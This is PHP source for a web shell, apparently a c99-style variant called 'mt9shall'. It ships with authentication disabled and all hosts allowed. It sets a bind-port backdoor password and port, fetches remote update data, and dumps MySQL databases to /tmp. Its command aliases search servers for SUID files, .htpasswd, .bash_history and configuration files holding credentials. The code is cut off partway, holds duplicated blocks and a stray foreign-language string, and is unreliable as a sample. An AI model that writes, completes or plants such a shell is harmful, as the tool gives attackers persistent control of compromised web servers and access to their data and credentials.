<?


if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
error_reporting(5);
@ignore_user_abort(true);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
if (!@ob_get_contents()) {@ob_start(); @ob_implicit_flush(0);}
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset( $k)) { $k = $v;}}

$shver = ""; //Current version
//CONFIGURATION AND SETTINGS
if (!empty($unset_surl)) {setcookie("mt9sh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("mt9sh_surl",$surl);}
else {$surl = $_REQUEST["mt9sh_surl"]; //Set this cookie for manual SURL
}

$surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL.




$surl = htmlspecialchars($surl);

$timelimit = 60; //limit of execution this script (seconds), 0 = unlimited.



	/*COMMENT IT FOR TURN ON AUTHENTIFICATION >>>*/	$login = false; //turn off authentification

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = "";

$autoupdate = false; //Automatic updating?
$updatenow = false; //If true, update now


$filestealth = false; //if true, don't change modify&access-time

$donated_html = "";
		/* If you publish free shall and you wish
		add link to your site or any other information,
		put here your html. */
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.

$curdir = "./"; //start directory
//$curdir = getenv("DOCUMENT_ROOT");
$tmpdir = ""; //Directory for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)
$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)



$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
$sort_save = true; //If true then save sorting-type.

// Registered file-types.
//  array(
//   "{action1}"=>array("ext1","ext2","ext3",...),
//   "{action2}"=>array("ext4","ext5","ext6",...),
//   ...
//  )
$ftypes  = array(
 "html"=>array("html","htm","shtml"),
 "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
 "exe"=>array("sh","install","bat","cmd"),
 "ini"=>array("ini","inf"),
 "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
 "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=>array("sdb"),
 "phpsess"=>array("sess"),
 "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);

// Registered executable file-types.
//  array(
//   string "command{i}"=>array("ext1","ext2","ext3",...),
//   ...
//  )
//   {command}: %f% = filename
$exeftypes  = array(
 getenv("PHPRC")." %f%"=>array("php","php3","php4"),
);

/* Highlighted files.
  array(
   i=>array({regexp},{type},{opentag},{closetag},{break})
   ...
  )
  string {regexp} - regular exp.
  int {type}:
	0 - files and folders (as default),
	1 - files only, 2 - folders only
  string {opentag} - open html-tag, e.g. "<b>" (default)
  string {closetag} - close html-tag, e.g. "</b>" (default)
  bool {break} - if true and found match then break
*/
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"<font color=\"yellow\">","</font>"), // example
  array("config.php",1) // example
);

$safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
									 // array (i=>{letter} ...); string {letter} - letter of a drive
									// Set as false or for turn off.
$hexdump_lines = 8;	// lines in hex preview file
$hexdump_rows = 24;	// 16, 24 or 32 bytes in one line

$nixpwdperpage = 100; // Get first N lines from /etc/passwd

$bindport_pass = "mt9";	  // default password for binding
$bindport_port = "11457"; // default port for binding

// Command-aliases


if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find all suid files", "find / -type f -perm -04000 -ls"),
  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
  array("find all sgid files", "find / -type f -perm -02000 -ls"),
  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable directories and files", "find / -perm -2 -ls"),
  array("find all writable directories and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
}
else
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}

$sess_cookie = "mt9shvars"; // Cookie-variable name

$usefsbuff = true; //Buffer-function
$copy_unset = false; //Remove copied files from buffer after pasting

//Quick launch
$quicklaunch = array();

//Highlight-code colors
$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

@$f = $_REQUEST["f"];
@extract($_REQUEST["mt9shcook"]);

//END CONFIGURATION


// 				\/	Next code isn't for editing	\/
$tmp = array();
foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cmt9shall\">mt9shall</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if ($login)
{
 if(empty($md5_pass)) {$md5_pass = md5($pass);}
 if (($_SERVER["PHP_AUTH_USER"] != $login ) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  if ($login_txt === false) {$login_txt = "";}
  elseif (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));}
  header("WWW-Authenticate: Basic realm=\"mt9shall ".$shver.": ".$login_txt."\"");
  header("HTTP/1.0 401 Unauthorized");
  exit($accessdeniedmess);
 }
}


if ($sort_save)
{
 if (!empty($sort)) {setcookie("sort",$sort);}
 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) > $len) 
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0, $len)."...".substr($content, -$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if (!is_numeric($size)) {return false;}
 else
 {
  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return true;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (!is_dir(dirname($t))) {mkdir(dirname($t));}
 if (is_dir($d))
 {
  if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1,1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d)) {return copy($d,$t);}
 else {return false;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   $ret = true;
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = false;}}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return true;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (is_dir($d))
 {
  if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1,1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d))
 {
  if(copy($d,$t)) {return unlink($d);}
  else {unlink($t); return false;}
 }
 else {return false;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1,1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return false;}
}
}

{
function mt9sh_getupdate()
{
 global $updatenow;
 $data = @file_get_contents($mt9sh_updatefurl."?version=".$shver."&");
 if (!$data) {echo "Can't fetch update-information!";}
 else
 {
  $data = unserialize(base64_decode($data));
  if (!is_array($data)) {echo "Corrupted update-information!";}
  elseif ($shver < $data["cur"]) {$updatenow = true;}
 }
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 global $shver;
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 $ret["err"] = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = 0;}
 if (empty($add_drop)) {$add_drop = true;}
 if (empty($file))
 {
  global $win;
  if ($win) {$file = "C:\\tmp\\dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
  else {$file = "/tmp/dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = true;}
 if (sizeof($tabs) == 0)
 {
  // retrive tables-list
  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 $SERVER_ADDR = getenv("SERVER_ADDR");
 $SERVER_NAME = getenv("SERVER_NAME");
 $out = "# Dumped by mt9shall.SQL v. ".$shver."
# LPANEL
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".$SERVER_ADDR." (".$SERVER_NAME.")"."
# Date: ".date("d.m.Y H:i:s")."
# ".gethostbyname($SERVER_ADDR)." (".$SERVER_ADDR.")"." dump db \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
   // recieve query for create table structure
   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
   if (!$res) {$ret["err"][] = mysql_smarterror();}
   else
   {
    $row = mysql_fetch_row($res);
    $out .= $row["1"].";\n\n";
    // recieve table variables
    $res = mysql_query("SELECT * FROM `$tab`", $sock);
    if (mysql_num_rows($res) > 0)
    {
     while ($row = mysql_fetch_assoc($res))
     {
      $keys = implode("`, `", array_keys($row));
      $values = array_values($row);
      foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
      $values = implode("', '", $values); 
      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
      $out .= $sql;
     } 
    }
   }
  }
 }
 $out .= "#---------------------------------------------------------------------------------\n\n";
 if ($file)
 {
  $fp = fopen($file, "w"); 
  if (!$fp) {$ret["err"][] = 2;}
  else
  {
   fwrite ($fp, $out);
   fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $out;
}
}
if (!function_exists("mysql_buildwhere"))
{
function mysql_buildwhere($array,$sep=" and",$functs=array())
{
 if (!is_array($array)) {$array = array();}
 $result = "";
 foreach($array as $k=>$v)
 {
  $value = "";
  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
  $value .= "'".addslashes($v)."'";
  if (!empty($functs[$k])) {$value .= ")";}
  $result .= "`".$k."` = ".$value.$sep;
 }
 $result = substr($result,0,strlen($result)-strlen($sep));
 return $result;
}
}
if (!function_exists("mysql_fetch_all"))
{
function mysql_fetch_all($query,$sock)
{
 if ($sock) {$result = mysql_query($query,$sock);}
 else {$result = mysql_query($query);}
 $array = array();
 while ($row = mysql_fetch_array($result)) {$array[] = $row;}
 mysql_free_result($result);
 return $array;
}
}
if (!function_exists("mysql_smarterror"))
{
function mysql_smarterror($type,$sock)
{
 if ($sock) {$error = mysql_error($sock);}
 else {$error = mysql_error();}
 $error = htmlspecialchars($error);
 return $error;
}
}
if (!function_exists("mysql_query_form"))
{
function mysql_query_form()
{
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act))
 {
  echo "<table border=0><tr><td><form action=\"".$sql_surl."\" name=\"mt9sh_sqlquery\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form></td>";
  if ($tbl_struct)
  {
   echo "<td valign=\"top\"><b>Fields:</b><br>";
   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "» <a href=\"#\" onclick=\"document.mt9sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
   echo "</td></tr></table>";
  }
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
}
if (!function_exists("mysql_create_db"))
{
function mysql_create_db($db,$sock="")
{
 $sql = "CREATE DATABASE `".addslashes($db)."`;";
 if ($sock) {return mysql_query($sql,$sock);}
 else {return mysql_query($sql);}
}
}
if (!function_exists("mysql_query_parse"))
{
function mysql_query_parse($query)
{
 $query = trim($query);
 $arr = explode (" ",$query);
 /*array array()
 {
  "METHOD"=>array(output_type),
  "METHOD1"...
  ...
 }
 if output_type == 0, no output,
 if output_type == 1, no output if no error
 if output_type == 2, output without control-buttons
 if output_type == 3, output with control-buttons
 */
 $types = array(
  "SELECT"=>array(3,1),
  "SHOW"=>array(2,1),
  "DELETE"=>array(1),
  "DROP"=>array(1)
 );
 $result = array();
 $op = strtoupper($arr[0]);
 if (is_array($types[$op]))
 {
  $result["propertions"] = $types[$op];
  $result["query"]  = $query;
  if ($types[$op] == 2)
  {
   foreach($arr as $k=>$v)
   {
    if (strtoupper($v) == "LIMIT")
    {
     $result["limit"] = $arr[$k+1];
     $result["limit"] = explode(",",$result["limit"]);
     if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
     unset($arr[$k],$arr[$k+1]);
    }
   }
  }
 }
 else {return false;}
}
}
if (!function_exists("mt9fsearch"))
{
function mt9fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $search_i_f;
 global $search_i_d;
 global $a;
 if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($f = readdir($h)) !== false)
 {
  if($f != "." && $f != "..")
  {
   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== false) || ($a["name_regexp"] and ereg($a["name"],$f));
   if (is_dir($d.$f))
   {
    $search_i_d++;
    if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
    if (!is_link($d.$f)) {mt9fsearch($d.$f);}
   }
   else
   {
    $search_i_f++;
    if ($bool)
    {
     if (!empty($a["text"]))
     {
      $r = @file_get_contents($d.$f);
      if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
      if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
      else {$bool = strpos(" ".$r,$a["text"],1);}
      if ($a["text_not"]) {$bool = !$bool;}
      if ($bool) {$found[] = $d.$f; $found_f++;}
     }
     else {$found[] = $d.$f; $found_f++;}
    }
   }
  }
 }
 closedir($h);
}
}


if (!$usefsbuff)
{
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.</center>";}
}
else
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); mt9_sess_put($sess_data); $act = "ls"; }
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); mt9_sess_put($sess_data); $act = "ls";}
 elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} mt9_sess_put($sess_data); $act = "ls";}
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); mt9_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  mt9_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
 elseif ($actarcbuff)
 {
  $arcerr = "";
  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
  else {$ext = ".tar.gz";}
  if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
  $cmdline .= " ".$actarcbuff_path;
  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
  foreach($objects as $v)
  {
   $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
   if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
   if (is_dir($v))
   {
    if (substr($v,-1,1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
    $v .= "*";
   }
   $cmdline .= " ".$v;
  }
  $tmp = realpath(".");
  chdir($d);
  $ret = myshallexec($cmdline);
  chdir($tmp);
  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
  $ret = str_replace("\r\n","\n",$ret);
  $ret = explode("\n",$ret);
  if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
  foreach($sess_data["cut"] as $k=>$v)
  {
   if (in_array($v,$ret)) {fs_rmobj($v);}
   unset($sess_data["cut"][$k]);
  }
  mt9_sess_put($sess_data);
  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
  $act = "ls";
 }
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$d)) {$psterr .= "Không thể sao chép ".$v." đến ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  mt9_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
}